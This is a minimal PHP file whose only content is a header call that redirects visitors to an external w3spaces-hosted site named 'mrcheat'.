<?php
header("Location: httpS://mrcheat.w3spaces.com");